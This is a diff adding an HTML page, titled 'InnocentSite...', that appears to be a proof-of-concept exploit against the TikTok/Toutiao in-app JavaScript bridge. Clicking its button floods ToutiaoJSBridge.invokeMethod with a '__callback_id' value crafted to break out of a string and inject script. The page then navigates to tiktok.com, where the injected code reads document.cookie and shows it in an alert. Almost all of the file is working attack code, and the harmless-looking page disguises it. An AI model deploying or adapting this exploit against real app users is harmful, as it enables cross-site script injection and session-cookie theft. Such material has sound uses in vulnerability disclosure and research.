@@ -1,0 +1,32 @@
+<html>
+  <head>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <link rel="prefetch" href="https://tiktok.com/">
+    <title>InnocentSite...</title>
+    
+    <script>
+      var payload = `
+              setTimeout(function () {
+                if (!window.called && location.href.includes("tiktok.com")) {
+                  alert("Show me your cookie:\\n" + document.cookie);
+                  window.called = true;
+                }
+              }, 1000)
+              `;
+      
+      function exp() {
+        setTimeout(function () {
+          for (var i=0; i<1024; i++) {
+            ToutiaoJSBridge.invokeMethod(JSON.stringify({'__callback_id': '" + ' + payload + '+"'}))
+          }
+        }, 0)
+        
+        window.location.href='https://tiktok.com/'
+      }
+    
+    </script>
+  </head>
+  <body>
+    <button onclick="exp();">Goforit...</button>
+  </body>
+</html>
